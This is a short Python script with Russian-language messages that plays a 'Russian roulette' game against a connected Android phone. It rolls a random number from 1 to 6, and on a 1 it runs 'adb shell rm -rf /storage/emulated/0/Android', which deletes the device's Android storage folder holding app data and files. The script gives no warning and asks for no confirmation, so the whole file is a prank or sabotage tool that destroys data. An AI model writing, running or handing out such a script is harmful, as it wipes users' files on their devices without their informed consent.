import random
import os
import subprocess

def remove_directory(path):
    try:
        subprocess.run(['adb', 'shell', 'rm', '-rf', path], check=True)
        print(f"Папка {path} успешно удалена.")
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при удалении папки: {e}")

random_number = random.randint(1, 6)
print(f"Случайное число: {random_number}")
if random_number == 1:
    remove_directory('/storage/emulated/0/Android') 
else:
    print("Папка не удалена, так как выпало число:", random_number)